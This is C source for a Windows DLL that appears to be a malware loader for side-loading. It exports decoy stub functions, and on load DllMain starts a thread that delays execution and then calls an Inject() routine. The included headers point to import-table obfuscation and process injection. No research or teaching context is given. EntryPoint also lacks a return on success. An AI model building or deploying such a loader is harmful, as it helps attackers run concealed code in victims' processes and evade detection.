#include <Windows.h>
#include "DelayExec.h"
#include "ObfuscateIAT.h"
#include "Inject.h"


__declspec(dllexport) int FiberBuild() 
{
	return 0;
}

extern __declspec(dllexport) int EntryPoint() 
{
    Wait(TRUE);

    if (Inject() == NULL)
    {
        SharedUserDataSleep(5000);
        return 0;
    }

}

__declspec(dllexport) int StartFiber() 
{
	return 0;
}

__declspec(dllexport) int FiberRuntimeInit() 
{
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		if (!CreateThread(NULL, NULL, EntryPoint, NULL, NULL, NULL)) 
		{
		     return FALSE;
		}
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

